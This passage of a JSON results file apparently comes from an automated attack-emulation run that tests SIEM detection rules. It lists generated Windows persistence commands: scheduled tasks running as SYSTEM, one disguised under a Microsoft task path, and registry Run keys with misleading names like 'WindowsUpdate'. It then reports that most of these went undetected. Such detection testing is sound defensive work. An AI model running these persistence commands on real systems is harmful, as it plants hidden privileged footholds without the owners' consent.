      "command": "powershell -Command \"try { $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NonInteractive -Command \\\"Write-Host 'Hello from scheduled task'\\\"'; $trigger = New-ScheduledTaskTrigger -AtLogOn; $settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 10); Register-ScheduledTask -TaskName 'DailyMaintenance' -Action $action -Trigger $trigger -User 'NT AUTHORITY\\SYSTEM' -Settings $settings -Force } catch { }\"",
      "description": "Uses PowerShell to create a scheduled task that runs at user logon with SYSTEM privileges",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Registers a scheduled task named 'DailyMaintenance' via PowerShell, triggered at logon, running under SYSTEM with execution time limit. Uses proper escaping and error handling.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:44.514514",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e405d666-a763-4c01-94e7-bcf215ee11c0",
      "ttp_id": "unknown",
      "technique_id": "T1053.005",
      "technique_name": "Scheduled Task/Job",
      "tactic": "execution",
      "platform": "windows",
      "command": "schtasks.exe /Create /TN \"\\Microsoft\\Windows\\Diag\\PerfTrack\" /TR \"cmd.exe /c \\\"%TEMP%\\diag_run.bat\\\"\" /SC DAILY /MO 1 /ST 02:00 /RU SYSTEM /RL HIGHEST",
      "description": "Abuses a legitimate Windows task path to create a disguised scheduled task with highest privileges",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Creates a scheduled task under a legitimate Windows namespace to blend in, set to run daily at 2 AM. Attempts privilege escalation via HIGHEST level. Task points to a benign batch script in %TEMP%.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:44.514514",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "445f0fd6-0a09-45e2-8e2c-260c3227c049",
      "ttp_id": "unknown",
      "technique_id": "T1547.001",
      "technique_name": "Registry Run Keys",
      "tactic": "execution",
      "platform": "windows",
      "command": "reg add \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" /v \"Updater\" /t REG_SZ /d \"C:\\\\Windows\\\\System32\\\\cmd.exe /c echo Hello\" /f",
      "description": "Adds a persistence entry to the current user's Run key using reg.exe, a built-in Windows utility.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A new string value 'Updater' is added to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, pointing to a benign command. This will execute on user logon.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:43.703750",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4594c5e1-2a88-4749-a9db-ec7915b234b5",
      "ttp_id": "unknown",
      "technique_id": "T1547.001",
      "technique_name": "Registry Run Keys",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Set-ItemProperty -Path 'HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -Name 'WindowsUpdate' -Value 'cmd.exe /c start calc.exe' -Force\"",
      "description": "Uses PowerShell to set a registry Run key for persistence under the current user.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a registry entry named 'WindowsUpdate' in the HKCU Run key that executes calc.exe on user login. Uses built-in cmd and calc for benign impact.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:43.703750",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "cb79522a-e5f8-46b9-9992-95125e06d12c",
      "ttp_id": "unknown",
      "technique_id": "T1547.001",
      "technique_name": "Registry Run Keys",
      "tactic": "execution",
      "platform": "windows",
      "command": "reg add \"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" /v \"TrustedApp\" /t REG_SZ /d \"C:\\\\Windows\\\\System32\\\\cmd.exe /c echo SystemStart\" /f",
      "description": "Modifies the local machine Run key to establish system-wide persistence using reg.exe.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Adds a registry value under HKLM\\...\\Run that executes a command at system startup. Requires administrator privileges. The change affects all users and persists across reboots.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:43.703750",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    }
  ],
  "siem_verification": [
    {
      "rule_id": "d0f920c5-7de2-43b9-a0ee-9fb3d8410a6b",
      "attack_id": "e8eb1e87-4aa3-4812-aeeb-5fa3582c207d",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 846.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "bb716978-9b3e-492a-b514-1115110ead50",
      "attack_id": "eaf86ae7-67bf-4113-b3f3-137f66de592e",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 635.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "c425467f-2955-4f40-bec4-cd4759e60ca2",
      "attack_id": "038cd684-c4b3-45c2-8b28-9e0d2e513daf",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 547.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "534edaf4-d2d6-43cf-8a77-0f8ecb0d83b8",
      "attack_id": "a124ee55-74ed-4ddb-b78b-a9cf56092829",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 526.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "9a284703-b9fe-4718-9931-0eee5d50b473",
      "attack_id": "11d1143c-484b-4fbb-950c-ca8073e8ec61",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 997.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "9284c9ba-50c1-4b1d-bfea-2d25b49b9cb6",
      "attack_id": "53782e1f-9409-4730-b2bf-44f0d655cb34",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 479.00000000000006,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "1c0cd537-6e95-48da-8f76-e99dd4b2af99",
      "attack_id": "17309714-80ec-4a39-90da-5ca1911079a7",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 451.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "b22d048e-99e5-42a6-8dfd-d3f876152063",
      "attack_id": "1edeb18d-3720-41bc-9421-b7034473557d",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 1014.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "0d19eed9-bd0c-4b3b-85da-5a9511781131",
      "attack_id": "ef84e0ad-5994-46cd-9d06-b63b3103b6d0",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 545.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "2517cafb-0fd3-4184-bdf2-1af5dfca1148",
      "attack_id": "b06751a1-f8f2-44f3-ba98-e036fa97739d",
      "detected": true,
      "events_found": 4,
      "historical_events": 0,
      "query_time_ms": 550.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "36665c17-962e-408c-9905-ff3616811a11",
      "attack_id": "d51f3eeb-0258-43ab-8533-df60f0b6e209",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 468.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "271595a1-0007-412f-9076-c7201cdf1450",
      "attack_id": "4e59c000-7172-40f8-9223-f4023694c1a9",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 606.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "e9dc1166-6f65-4b7d-bff9-235897364345",
      "attack_id": "938c2568-e04f-45e4-96be-9fa21448dc80",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 698.0000000000001,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "5b800ef7-abe7-4926-96f9-dd2976fbbbbf",
      "attack_id": "0051e66b-c6ca-47b6-b864-c44c15a916fd",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 919.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "5bc18ad4-95ed-4940-a535-bcf86933ff56",
      "attack_id": "15e04357-8d1d-49a0-bff1-73f53c77bcb2",
      "detected": true,
      "events_found": 60,
      "historical_events": 0,
      "query_time_ms": 956.0000000000001,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "29874848-eafc-49fb-ac4b-6af9db99faed",
      "attack_id": "d16b1c73-bcce-4799-b509-9148827919ea",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 515.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "aecbc176-09f4-4b2b-b210-8d54dc81b410",
      "attack_id": "94916816-ad9b-485b-98a5-908014cc08cf",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 1125.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "21ee97f5-0c44-4f71-86c3-bf0ab711391f",
      "attack_id": "ea78776b-f90d-4872-a9b0-8efbf426688e",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 716.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "94b52f0d-6e57-48e8-8b6d-0d369c2c250b",
      "attack_id": "23f376b2-04e5-4d00-806a-6c62f455e610",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 772.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "6f558c30-eab6-4e57-8e9b-d5d9cc464159",
      "attack_id": "870ac9ed-b29a-4801-ac0a-b45a38a01e4f",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 741.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "76d85155-9661-4024-a41b-dc9cf662cd7c",
      "attack_id": "762c2cc2-b538-4b7b-aa0d-f9802daa1bfe",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 884.0,
      "status": "success",
      "message": "Verification complete"
    }
  ],
  "siem_metrics": {
    "true_positives": 2,
    "false_positives": 0,
    "false_negatives": 19,
    "true_negatives": 0,
    "precision": 1.0,
    "recall": 0.09523809523809523,
    "f1_score": 0.17391304347826084,
    "accuracy": 0.09523809523809523,
    "detection_rate": 0.09523809523809523,
    "false_positive_rate": 0.0
  },
  "iterations": 3,
  "final_score": 0.532,
  "timestamp": "2025-12-23T14:57:09.680894"
}